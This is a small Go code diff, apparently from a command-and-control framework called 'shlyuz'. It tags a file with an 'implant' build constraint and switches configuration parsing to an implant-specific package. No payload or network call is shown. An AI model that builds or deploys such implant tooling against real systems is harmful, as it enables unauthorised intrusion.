@@ -1,3 +1,5 @@
+//go:build implant
+
 package main
 
 import (
@@ -8,6 +10,7 @@ import (
 
 	"shlyuz/pkg/component"
 	"shlyuz/pkg/config"
+	"shlyuz/pkg/config/vzhivlyatconfig"
 	"shlyuz/pkg/crypto/asymmetric"
 	"shlyuz/pkg/instructions"
 	"shlyuz/pkg/transaction"
@@ -46,7 +49,7 @@ func genComponentInfo() component.Component {
 	}
 	// componentConfig := config.ReadConfig(rawConfig, YadroComponent.XorKey, symKey)
 	componentConfig := config.ReadPlaintextConfig(rawConfig, symKey) // debug
-	parsedConfig := config.ParseConfig(componentConfig.Message)
+	parsedConfig := vzhivlyatconfig.ParseConfig(componentConfig.Message)
 	YadroComponent.Config.Id = parsedConfig.Id
 	YadroComponent.ComponentId = YadroComponent.Config.Id
 	YadroComponent.Config.TransportName = parsedConfig.TransportName
